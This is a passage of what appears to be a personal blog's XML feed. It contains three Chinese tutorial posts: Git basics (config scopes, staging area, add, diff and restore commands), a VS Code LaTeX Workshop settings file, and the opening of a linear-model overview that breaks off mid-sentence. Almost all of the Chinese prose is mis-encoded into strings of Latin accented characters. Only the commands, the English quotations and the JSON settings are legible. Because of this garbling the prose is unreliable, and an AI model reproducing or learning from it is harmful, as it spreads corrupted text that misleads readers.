        <content type="html"><![CDATA[<h2 id="ç®€ä»‹">ç®€ä»‹</h2><p>Git å½“åˆæ˜¯ Linus ä¸ºäº†ç®¡ç† Linux ä»£ç ï¼Œç”¨ Cè¯­è¨€å†™çš„ä¸€ä¸ªåˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿ</p><ul><li>Git æ˜¯å…¨å¹³å°çš„ï¼ˆLinuxã€Unixã€Macã€Windows)</li><li>æ‰€æœ‰çš„ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œå…¶å®åªèƒ½è·Ÿè¸ªæ–‡æœ¬æ–‡ä»¶çš„æ”¹åŠ¨ï¼Œæ¯”å¦‚ TXTæ–‡ä»¶ï¼Œç½‘é¡µï¼Œæ‰€æœ‰çš„ç¨‹åºä»£ç ã€markdown ç­‰ç­‰ï¼Œè€Œwordã€å›¾ç‰‡ã€è§†é¢‘ç­‰äºŒè¿›åˆ¶æ ¼å¼çš„æ–‡ä»¶æ— æ³•è¢«è·Ÿè¸ªæ”¹åŠ¨ï¼Œåªæ˜¯çŸ¥é“æ”¹åŠ¨å¤§å°è€Œå·²ã€‚</li><li>å› ä¸ºæ–‡æœ¬æ˜¯æœ‰ç¼–ç çš„ï¼Œæ¯”å¦‚ä¸­æ–‡æœ‰å¸¸ç”¨çš„ GBK ç¼–ç ï¼Œæ—¥æ–‡æœ‰ Shift_JISç¼–ç ï¼Œå¦‚æœæ²¡æœ‰å†å²é—ç•™é—®é¢˜ï¼Œå¼ºçƒˆå»ºè®®ä½¿ç”¨æ ‡å‡†çš„ UTF-8ç¼–ç ï¼Œæ‰€æœ‰è¯­è¨€ä½¿ç”¨åŒä¸€ç§ç¼–ç ï¼Œæ—¢æ²¡æœ‰å†²çªï¼Œåˆè¢«æ‰€æœ‰å¹³å°æ‰€æ”¯æŒã€‚</li></ul><h3 id="åˆ†å¸ƒå¼ä¸é›†ä¸­å¼">åˆ†å¸ƒå¼ä¸é›†ä¸­å¼</h3><p>CVS åŠ SVN éƒ½æ˜¯é›†ä¸­å¼çš„ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œç”±äº CVSè‡ªèº«è®¾è®¡çš„é—®é¢˜ï¼Œä¼šé€ æˆæäº¤æ–‡ä»¶ä¸å®Œæ•´ï¼Œç‰ˆæœ¬åº“è«åå…¶å¦™æŸåçš„æƒ…å†µã€‚åŒæ ·æ˜¯å¼€æºè€Œä¸”å…è´¹çš„SVN ä¿®æ­£äº† CVSçš„ä¸€äº›ç¨³å®šæ€§é—®é¢˜ï¼Œæ˜¯ç›®å‰ç”¨å¾—æœ€å¤šçš„é›†ä¸­å¼ç‰ˆæœ¬åº“æ§åˆ¶ç³»ç»Ÿã€‚è€Œ Gitåˆ™æ˜¯ç›®å‰æœ€æµè¡Œçš„åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿã€‚</p><h3 id="é›†ä¸­å¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿ">é›†ä¸­å¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿ</h3><p>é›†ä¸­å¼ç‰ˆæœ¬æ§åˆ¶ï¼š ä»ä¸­å¤®æœåŠ¡å™¨å– -&gt; ä¿®æ”¹ -&gt; æ¨é€ç»™ä¸­å¤®æœåŠ¡å™¨ç¼ºç‚¹ï¼š</p><ol type="1"><li>é›†ä¸­å¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿæœ€å¤§çš„æ¯›ç—…å°±æ˜¯å¿…é¡»è”ç½‘æ‰èƒ½å·¥ä½œï¼Œå¦‚æœåœ¨å±€åŸŸç½‘å†…è¿˜å¥½ï¼Œå¸¦å®½å¤Ÿå¤§ï¼Œé€Ÿåº¦å¤Ÿå¿«ï¼Œå¯å¦‚æœåœ¨äº’è”ç½‘ä¸Šï¼Œé‡åˆ°ç½‘é€Ÿæ…¢çš„è¯ï¼Œå¯èƒ½æäº¤ä¸€ä¸ª10M çš„æ–‡ä»¶å°±éœ€è¦ 5 åˆ†é’Ÿ</li><li>ä¸­å¤®æœåŠ¡å™¨å‡ºé—®é¢˜ï¼Œè¯¥é¡¹ç›®å°±åœæ»äº†</li></ol><h3 id="åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿ">åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿ</h3><p>åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿæ ¹æœ¬æ²¡æœ‰â€œä¸­å¤®æœåŠ¡å™¨â€ï¼Œæ¯ä¸ªäººçš„ç”µè„‘ä¸Šéƒ½æ˜¯ä¸€ä¸ªå®Œæ•´çš„ç‰ˆæœ¬åº“åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿé€šå¸¸ä¹Ÿæœ‰ä¸€å°å……å½“â€œä¸­å¤®æœåŠ¡å™¨â€çš„ç”µè„‘ï¼Œä½†è¿™ä¸ªæœåŠ¡å™¨çš„ä½œç”¨ä»…ä»…æ˜¯ç”¨æ¥æ–¹ä¾¿â€œäº¤æ¢â€å¤§å®¶çš„ä¿®æ”¹ï¼Œæ²¡æœ‰å®ƒå¤§å®¶ä¹Ÿä¸€æ ·å¹²æ´»ï¼Œåªæ˜¯äº¤æ¢ä¿®æ”¹ä¸æ–¹ä¾¿è€Œå·²ã€‚</p><p>Git æ¨å´‡çš„é¢‘ç¹ä¸”è¯¦ç»†æè¿°çš„æäº¤ï¼Œè€Œä¸æ˜¯ç¡®è®¤æ—  Bug æ‰æäº¤ã€‚</p><p>ä¼˜ç‚¹ï¼š</p><ol type="1"><li>ä¸éœ€è¦è”ç½‘ï¼Œå°±å¯ä»¥å·¥ä½œï¼Œåªéœ€è¦åœ¨è”ç½‘åæ¨é€ä¸Šå»å³å¯</li><li>ä¸€ä»½æ‹·è´åæ‰ï¼Œåªéœ€ä»åˆ«çš„åœ°æ–¹å†æ‹·è´ä¸€ä»½å³å¯</li><li>Git å…·æœ‰æå…¶å¼ºå¤§çš„åˆ†æ”¯ç®¡ç†</li></ol><h2 id="æœ€å°åŒ–é…ç½®">æœ€å°åŒ–é…ç½®</h2><p>é…ç½®å‚ä¸é¡¹ç›®å¼€å‘äººå‘˜çš„ user.name å’Œ user.email,ä¾¿äºåœ¨å‡ºç°ä»£ç å˜æ›´ç­‰æƒ…å†µæ—¶ï¼Œ gitæœåŠ¡å™¨å¯ä»¥åŠæ—¶åœ°é€šè¿‡é‚®ä»¶è¿›è¡Œæé†’ã€‚ï¼ˆå› æ­¤ï¼Œé‚®ç®±éœ€è¦æ˜¯ä¸€ä¸ªä½ èƒ½å¤ŸåŠæ—¶æ¥æ”¶åˆ°ä¿¡æ¯çš„é‚®ç®±ï¼‰å¦‚æœä½ å¿˜è®°äº†è¿›è¡Œè¯¥é…ç½®ï¼Œåç»­åœ¨ gitåšå˜æ›´æäº¤çš„æ—¶å€™ï¼Œä¼šæç¤ºä½ è¿›è¡Œè¯¥é…ç½®ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name &quot;your_name&quot;</span><br><span class="line">git config --global user.email &quot;your_email&quot;</span><br></pre></td></tr></table></figure><p><code>your_name</code> å’Œ <code>your_email</code>æ ¹æ®è‡ªå·±çš„ä¿¡æ¯å¡«å†™ã€‚ä¸€èˆ¬æˆ‘å°±å†™ github çš„ç”¨æˆ·åå’Œé‚®ç®±ã€‚</p><h3 id="config-çš„ä¸‰ä¸ªä½œç”¨åŸŸ">config çš„ä¸‰ä¸ªä½œç”¨åŸŸ</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git config --local</span><br><span class="line">git config --global</span><br><span class="line">git config --system</span><br></pre></td></tr></table></figure><p>local åªå¯¹æŸä¸ªä»“åº“æœ‰æ•ˆ global å¯¹å½“å‰ç”¨æˆ·æ‰€æœ‰ä»“åº“æœ‰æ•ˆ systemå¯¹ç³»ç»Ÿæ‰€æœ‰ç™»å½•çš„ç”¨æˆ·æœ‰æ•ˆ</p><p>æ˜¾ç¤º config çš„é…ç½®ï¼Œ åŠ  <code>--list</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git config --list --local</span><br><span class="line">git config --list --global</span><br><span class="line">git config --list --system</span><br></pre></td></tr></table></figure><h2 id="å·¥ä½œåŒºæš‚å­˜åŒºä¸ç‰ˆæœ¬åº“">å·¥ä½œåŒº,æš‚å­˜åŒºä¸ç‰ˆæœ¬åº“</h2><p>Git ç®¡ç†çš„æ–‡ä»¶åˆ†ä¸ºï¼šå·¥ä½œåŒºï¼ˆWorkingDirectoryï¼‰ï¼Œç‰ˆæœ¬åº“ï¼ˆRepositoryï¼‰ã€‚ ç‰ˆæœ¬åº“åˆåˆ†ä¸ºæš‚å­˜åŒº stageï¼ˆæˆ–è€…å«indexï¼‰å’Œ Git ä¸ºæˆ‘ä»¬è‡ªåŠ¨åˆ›å»ºçš„ç¬¬ä¸€ä¸ªåˆ†æ”¯ masterï¼Œä»¥åŠæŒ‡å‘ masterçš„ä¸€ä¸ªæŒ‡é’ˆå« HEADã€‚</p><p><imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/image-20200314170717871.png"alt="image-20200314170717871" /> <imgsrc="https://raw.githubusercontent.com/violetu/blogimages/master/20204301588227262697.png"alt="git sectors" /></p><p>å·¥ä½œåŒº working directory --&gt; æš‚å­˜åŒº stage --&gt; ä»“åº“Repository</p><ul><li><p><code>git add</code> å°†å·¥ä½œåŒº working directory çš„æ–‡ä»¶çº³å…¥ gitçš„æš‚å­˜åŒº stage è¿›è¡Œç´¢å¼•(index)ï¼Œ<code>git commit</code> æŠŠæ–‡ä»¶ä»æš‚å­˜åŒº--&gt; ä»“åº“ï¼Œ</p><ol type="1"><li><p><code>git add filename1 foldername</code>æ˜¾å¼æŒ‡å®šæ–‡ä»¶æˆ–æ–‡ä»¶å¤¹åï¼Œè¿›è¡Œæ·»åŠ </p></li><li><p><code>git add *.md</code> ä½¿ç”¨é€šé…ç¬¦æ·»åŠ æ»¡è¶³æ¡ä»¶çš„æ–‡ä»¶</p></li><li><p><code>git add -u</code></p><blockquote><p>Update the index just where it already has an entry matching<code>&lt;pathspec&gt;</code>. This removes as well as modifies indexentries to match the working tree, but adds no new files.</p><p>If no <code>&lt;pathspec&gt;</code> is given when -u option is used,all tracked files in the entire working tree are updated</p></blockquote><p>ä¿®æ”¹ã€åˆ é™¤å·²è¢« stage ç´¢å¼•çš„é¡¹ï¼Œä½†ä¸ä¼šå°†æ–°å¢æ–‡ä»¶çº³å…¥ stage è¿›è¡Œindex.</p></li><li><p><code>git add -A</code></p><blockquote><p>Update the index not only where the working tree has a file matching<code>&lt;pathspec&gt;</code> but also where the index already has anentry. This adds, modifies, and removes index entries to match theworking tree.</p><p>If no <code>&lt;pathspec&gt;</code> is given when -A option is used,all files in the entire working tree are updated</p></blockquote><p>æ›´æ–°å·²è¢« stage ç´¢å¼•çš„é¡¹ï¼Œå¹¶å°†æ–°å¢æ–‡ä»¶çº³å…¥ stage ç´¢å¼•ã€‚</p></li></ol></li><li><p><code>git diff</code> æŸ¥çœ‹å·¥ä½œåŒºå’Œæš‚å­˜åŒºå·®å¼‚</p></li><li><p><code>git diff filename</code>: æ¯”è¾ƒå·¥ä½œåŒºå’Œæš‚å­˜åŒº</p></li><li><p><code>git diff --cached</code> æŸ¥çœ‹æš‚å­˜åŒºå’Œä»“åº“å·®å¼‚ï¼Œ</p></li><li><p><code>git diff HEAD</code> æŸ¥çœ‹å·¥ä½œåŒºå’Œä»“åº“çš„å·®å¼‚ï¼Œ</p></li><li><p><code>git diff HEAD -- filename</code>å‘½ä»¤å¯ä»¥æŸ¥çœ‹å·¥ä½œåŒºå’Œä»“åº“é‡Œé¢æœ€æ–°ç‰ˆæœ¬çš„åŒºåˆ«</p></li><li><p><code>git add</code> çš„åå‘å‘½ä»¤:</p><p>æ—§å‘½ä»¤ï¼š<code>git checkout -- &lt;filename&gt;</code> å¯ä»¥ç”¨æ–°å‘½ä»¤<code>git restore &lt;filename&gt;</code> æ›¿ä»£ï¼Œæ’¤é”€å·¥ä½œåŒºä¿®æ”¹ï¼Œå³æŠŠæš‚å­˜åŒºæœ€æ–°ç‰ˆæœ¬è½¬ç§»åˆ°å·¥ä½œåŒºï¼Œ<code>git checkout -- file</code> å‘½ä»¤ä¸­çš„ <code>--</code> å¾ˆé‡è¦ï¼Œæ²¡æœ‰<code>--</code>ï¼Œå°±å˜æˆäº†â€œåˆ‡æ¢åˆ°å¦ä¸€ä¸ªåˆ†æ”¯â€çš„å‘½ä»¤ï¼Œæˆ‘ä»¬åœ¨åé¢çš„åˆ†æ”¯ç®¡ç†ä¸­ä¼šå†æ¬¡é‡åˆ°<code>git checkout</code> å‘½ä»¤ã€‚</p></li><li><p>æŸ¥çœ‹ git ç‰ˆæœ¬ï¼š<code>git --version</code></p></li><li><p><code>git status</code> æŸ¥çœ‹å·¥ä½œåŒºçš„çŠ¶æ€</p></li><li><p>å¦‚æœ <code>git status</code> å‘Šè¯‰ä½ æœ‰æ–‡ä»¶è¢«ä¿®æ”¹è¿‡ï¼Œç”¨<code>git diff</code> å¯ä»¥æŸ¥çœ‹ä¿®æ”¹å†…å®¹ã€‚</p></li></ul><h3 id="å¸®åŠ©æ‰‹å†Œ">å¸®åŠ©æ‰‹å†Œ</h3><p>ä»¥ <code>git log</code> ä¸ºä¾‹: 1. <code>git log --help</code> æŸ¥çœ‹ gitlog çš„å¸®åŠ©ã€‚ 2. <code>git help log</code></p><h2 id="å‚è€ƒèµ„æ–™">å‚è€ƒèµ„æ–™</h2><blockquote><ol type="1"><li><ahref="https://git201901.github.io/github_pages_learning/">github_pages_learning</a></li><li><ahref="http://marklodato.github.io/visual-git-guide/index-en.html">AVisual Git Reference</a></li><li><ahref="https://blog.csdn.net/u010412719/article/details/72860193">githubæ–°å»ºæœ¬åœ°ä»“åº“å¹¶å°†ä»£ç æäº¤åˆ°è¿œç¨‹ä»“åº“</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> git </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ç”µè„‘ä¸Š é…ç½®ä¸ä½¿ç”¨ LaTex é…ç½®</title>
      <link href="/blog/2021/09/16/misc/latex/latex_config_use/"/>
      <url>/blog/2021/09/16/misc/latex/latex_config_use/</url>
      
        <content type="html"><![CDATA[<p>åœ¨ windows ä¸Šï¼Œå¯ä»¥é…ç½® TeXlive + tex studioï¼ŒTeXstudioç±»ä¼¼é›†æˆå¼€å‘ç¯å¢ƒï¼Œæ˜¯ä¸€ä¸ªåŠŸèƒ½å¼ºå¤§çš„ LaTeX ç¼–è¾‘å™¨ï¼Œå°±æ˜¯é¢œå€¼æœ‰ç‚¹ä¸‘ã€‚</p><p>åœ¨ macos ä¸Šï¼Œå¯ä»¥é…ç½® <a href="https://www.texpad.com/">texpad</a> +mathpadï¼Œtexpad æ˜¯ä¸€æ¬¾é¢œå€¼é«˜çš„ LaTeX ç¼–è¾‘å™¨ï¼Œmathpad å†™å…¬å¼æ–¹ä¾¿ã€‚macosä½¿ç”¨ texpad è¿˜éœ€è¦ä¸‹è½½ MacTeXï¼ŒMacTeX is a package which installs TeXLive on the Macintosh.</p><h2 id="é€šç”¨">é€šç”¨</h2><ol type="1"><li><p><a href="https://www.overleaf.com/">overleaf åœ¨çº¿</a> ä¼˜ç‚¹ï¼š1.å³å¼€å³ç”¨ 3. å¯ä»¥ç½‘ä¸Šå…±äº«ï¼Œä¿®æ”¹ç¼ºç‚¹ï¼šç¼–è¯‘æ—¶é•¿æœ‰é™åˆ¶ï¼Œé«˜è´¨é‡å›¾ç‰‡æ”¾å¤šäº†ï¼Œç¼–è¯‘ä¸å‡ºæ¥éœ€è¦å¼€ä¼šå‘˜ã€‚</p></li><li><p>[Recommend]ä½¿ç”¨ vscode + latex workshop vscode é…ç½®å‚è€ƒï¼š <ahref="https://www.zhihu.com/question/19954023/answer/676316395">æœ‰å“ªäº›å¥½çš„LaTeX ç¼–è¾‘å™¨ï¼Ÿ - é»„ç›¼çš„å›ç­” - çŸ¥ä¹</a> <ahref="https://blog.slkun.me/2018/11/vscode-latex.html">åˆ©ç”¨ VSCodeæ„å»ºç®€å•çš„&gt;<span class="math inline">\(\LaTeX\)</span>&lt;ç¼–è¾‘å™¨ -ç†æƒ³åŒ–ç››å¤è®¡åˆ’</a></p></li></ol><p>æœ¬äººä¸»è¦é‡‡ç”¨ vscode + latex workshopï¼Œ é…ç½®å¦‚ä¸‹ï¼Œä¸€èˆ¬ç›´æ¥ä¸‹è½½texliveï¼Œç„¶åå®‰è£… latex workshop æ’ä»¶ï¼ŒæŠŠé…ç½®å¤åˆ¶åˆ° vscode çš„ settingä¸­å³å¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line">&quot;latex-workshop.latex.autoBuild.run&quot;: &quot;never&quot;,</span><br><span class="line">&quot;latex-workshop.showContextMenu&quot;: true,</span><br><span class="line">&quot;latex-workshop.intellisense.package.enabled&quot;: true,</span><br><span class="line">&quot;latex-workshop.message.error.show&quot;: true,</span><br><span class="line">&quot;latex-workshop.message.warning.show&quot;: false,</span><br><span class="line">&quot;latex-workshop.latex.tools&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;name&quot;: &quot;xelatex&quot;,</span><br><span class="line">        &quot;command&quot;: &quot;xelatex&quot;,</span><br><span class="line">        &quot;args&quot;: [</span><br><span class="line">            &quot;-shell-escape&quot;,</span><br><span class="line">            &quot;-synctex=1&quot;,</span><br><span class="line">            &quot;-interaction=nonstopmode&quot;,</span><br><span class="line">            &quot;-file-line-error&quot;,</span><br><span class="line">            &quot;%DOC%&quot;</span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;name&quot;: &quot;pdflatex&quot;,</span><br><span class="line">        &quot;command&quot;: &quot;pdflatex&quot;,</span><br><span class="line">        &quot;args&quot;: [</span><br><span class="line">            &quot;-shell-escape&quot;,</span><br><span class="line">            &quot;-synctex=1&quot;,</span><br><span class="line">            &quot;-interaction=nonstopmode&quot;,</span><br><span class="line">            &quot;-file-line-error&quot;,</span><br><span class="line">            &quot;%DOC%&quot;</span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;name&quot;: &quot;latexmk&quot;,</span><br><span class="line">        &quot;command&quot;: &quot;latexmk&quot;,</span><br><span class="line">        &quot;args&quot;: [</span><br><span class="line">            &quot;-shell-escape&quot;,</span><br><span class="line">            &quot;-synctex=1&quot;,</span><br><span class="line">            &quot;-interaction=nonstopmode&quot;,</span><br><span class="line">            &quot;-file-line-error&quot;,</span><br><span class="line">            &quot;-pdf&quot;,</span><br><span class="line">            &quot;-outdir=%OUTDIR%&quot;,</span><br><span class="line">            &quot;%DOC%&quot;</span><br><span class="line">        ]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;name&quot;: &quot;bibtex&quot;,</span><br><span class="line">        &quot;command&quot;: &quot;bibtex&quot;,</span><br><span class="line">        &quot;args&quot;: [&quot;%DOCFILE%&quot;]</span><br><span class="line">    &#125;</span><br><span class="line">],</span><br><span class="line">&quot;latex-workshop.latex.recipes&quot;: [</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;name&quot;: &quot;pdflatex -&gt; bibtex -&gt; pdflatex*2&quot;,</span><br><span class="line">        &quot;tools&quot;: [&quot;pdflatex&quot;, &quot;bibtex&quot;, &quot;pdflatex&quot;, &quot;pdflatex&quot;]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;name&quot;: &quot;XeLaTeX&quot;,</span><br><span class="line">        &quot;tools&quot;: [&quot;xelatex&quot;]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;name&quot;: &quot;PDFLaTeX&quot;,</span><br><span class="line">        &quot;tools&quot;: [&quot;pdflatex&quot;]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;name&quot;: &quot;BibTeX&quot;,</span><br><span class="line">        &quot;tools&quot;: [&quot;bibtex&quot;]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;name&quot;: &quot;LaTeXmk&quot;,</span><br><span class="line">        &quot;tools&quot;: [&quot;latexmk&quot;]</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        &quot;name&quot;: &quot;xelatex -&gt; bibtex -&gt; xelatex*2&quot;,</span><br><span class="line">        &quot;tools&quot;: [&quot;xelatex&quot;, &quot;bibtex&quot;, &quot;xelatex&quot;, &quot;xelatex&quot;]</span><br><span class="line">    &#125;</span><br><span class="line">],</span><br><span class="line"></span><br><span class="line">&quot;latex-workshop.latex.clean.fileTypes&quot;: [</span><br><span class="line">    &quot;*.aux&quot;,</span><br><span class="line">    &quot;*.bbl&quot;,</span><br><span class="line">    &quot;*.blg&quot;,</span><br><span class="line">    &quot;*.idx&quot;,</span><br><span class="line">    &quot;*.ind&quot;,</span><br><span class="line">    &quot;*.lof&quot;,</span><br><span class="line">    &quot;*.lot&quot;,</span><br><span class="line">    &quot;*.out&quot;,</span><br><span class="line">    &quot;*.toc&quot;,</span><br><span class="line">    &quot;*.acn&quot;,</span><br><span class="line">    &quot;*.acr&quot;,</span><br><span class="line">    &quot;*.alg&quot;,</span><br><span class="line">    &quot;*.glg&quot;,</span><br><span class="line">    &quot;*.glo&quot;,</span><br><span class="line">    &quot;*.gls&quot;,</span><br><span class="line">    &quot;*.ist&quot;,</span><br><span class="line">    &quot;*.fls&quot;,</span><br><span class="line">    &quot;*.log&quot;,</span><br><span class="line">    &quot;*.fdb_latexmk&quot;</span><br><span class="line">],</span><br><span class="line">&quot;latex-workshop.latex.autoClean.run&quot;: &quot;onBuilt&quot;,</span><br><span class="line">&quot;latex-workshop.latex.recipe.default&quot;: &quot;lastUsed&quot;,</span><br><span class="line">&quot;latex-workshop.view.pdf.internal.synctex.keybinding&quot;: &quot;double-click&quot;,</span><br><span class="line">&quot;latex-workshop.view.pdf.viewer&quot;: &quot;tab&quot;,</span><br><span class="line">&quot;latex-workshop.latexindent.path&quot;: &quot;/Library/TeX/texbin/latexindent&quot;,</span><br><span class="line">&quot;[latex]&quot;: &#123;</span><br><span class="line">    &quot;editor.formatOnSave&quot;: false</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
          <category> latex </category>
          
      </categories>
      
      
        <tags>
            
            <tag> latex </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>çº¿æ€§æ¨¡å‹æ¦‚è¿°</title>
      <link href="/blog/2021/07/19/ml/3.linear_model/"/>
      <url>/blog/2021/07/19/ml/3.linear_model/</url>
      
        <content type="html"><![CDATA[<h2 id="ç®€ä»‹">ç®€ä»‹</h2><p>ç»™å®šç”± d ä¸ªå±æ€§æè¿°çš„ç¤ºä¾‹<spanclass="math inline">\(\boldsymbol{x}=\left(x_{1} ; x_{2} ; \ldots ;x_{d}\right)\)</span>ï¼Œ å…¶ä¸­<span class="math inline">\(x_{i}\)</span>æ˜¯<span class="math inline">\(\boldsymbol{x}\)</span> åœ¨ç¬¬ iä¸ªå±æ€§ä¸Šçš„å–å€¼ï¼Œçº¿æ€§æ¨¡å‹(linearmodel)è¯•å›¾å­¦å¾—ä¸€ä¸ªé€šè¿‡å±æ€§çš„çº¿æ€§ç»„åˆæ¥è¿›è¡Œé¢„æµ‹çš„å‡½æ•°ï¼Œå³ <spanclass="math display">\[f(x)=w_{1} x_{1}+w_{2} x_{2}+\ldots+w_{d}x_{d}+b\]</span> ä¸€èˆ¬ç”¨å‘é‡å½¢å¼å†™æˆ: <spanclass="math display">\[f(x)=\textbf{w}^{T}\textbf{x}+b\]</span></p><ul><li><strong>Ï‰</strong>ç›´è§‚è¡¨è¾¾äº†å„å±æ€§åœ¨é¢„æµ‹ä¸­çš„é‡è¦æ€§ï¼Œå› æ­¤çº¿æ€§æ¨¡å‹æœ‰å¾ˆå¥½çš„å¯è§£é‡Šæ€§</li><li>è®¸å¤šåŠŸèƒ½æ›´ä¸ºå¼ºå¤§çš„éçº¿æ€§æ¨¡å‹(nonlinearmodel)å¯åœ¨çº¿æ€§æ¨¡å‹çš„åŸºç¡€ä¸Šé€šè¿‡å¼•å…¥å±‚çº§ç»“æ„æˆ–é«˜ç»´æ˜ å°„è€Œå¾—.</li></ul><p>æœ¬ç« ä»‹ç»å‡ ç§ç»å…¸çš„çº¿æ€§æ¨¡å‹ï¼Œå…ˆä»å›å½’ä»»åŠ¡å¼€å§‹ï¼Œç„¶åè®¨è®ºäºŒåˆ†ç±»å’Œå¤šåˆ†ç±»ä»»åŠ¡ã€‚</p><h2 id="çº¿æ€§å›å½’">çº¿æ€§å›å½’</h2><p>çº¿æ€§å›å½’(linearregression)è¯•å›¾å­¦å¾—ä¸€ä¸ªçº¿æ€§æ¨¡å‹ä»¥å°½å¯èƒ½å‡†ç¡®åœ°é¢„æµ‹å®å€¼è¾“å‡ºæ ‡è®°ã€‚</p><p>çº¿æ€§æ¨¡å‹ï¼ˆlinearmodelï¼‰è¯•å›¾é€šè¿‡å¯¹æ‰€ç»™çš„å±æ€§/ç‰¹å¾çš„çº¿æ€§ç»„åˆè¿›è¡Œå­¦ä¹ ï¼Œè¿›è€Œå¾—å‡ºä¸€ä¸ªé¢„æµ‹å‡½æ•°ã€‚çº¿æ€§æ¨¡å‹æ—¢å¯ä»¥ç”¨ä½œåˆ†ç±»é—®é¢˜ï¼Œåˆå¯ä»¥ç”¨ä½œå›å½’ç±»é—®é¢˜ã€‚åœ¨å›å½’ç±»é—®é¢˜ä¸­ï¼Œé€šè¿‡å±æ€§ç»„åˆæ¥æ‹Ÿåˆä¸€ä¸ªçº¿æ€§å‡½æ•°ï¼Œåœ¨åˆ†ç±»é—®é¢˜å½“ä¸­ï¼Œé€šè¿‡å±æ€§ç»„åˆç¡®å®šä¸€ä¸ªåˆ†ç±»è¾¹ç•Œã€‚</p><ol type="1"><li><p>æœ‰åºæ— åºå±æ€§çš„æ•°å­¦è½¬åŒ–å¯¹ç¦»æ•£å±æ€§ï¼Œè‹¥å±æ€§å€¼é—´å­˜åœ¨â€åºâ€œ(order)å…³ç³»ï¼Œå¯é€šè¿‡è¿ç»­åŒ–å°†å…¶è½¬åŒ–ä¸ºè¿ç»­å€¼ï¼Œä¾‹å¦‚äºŒå€¼å±æ€§â€œèº«é«˜â€çš„å–å€¼â€œé«˜â€ã€â€çŸ®â€œå¯è½¬åŒ–ä¸º{1.0ï¼Œ0.0},ä¸‰å€¼å±æ€§"é«˜åº¦"çš„å–å€¼"é«˜" "ä¸­" 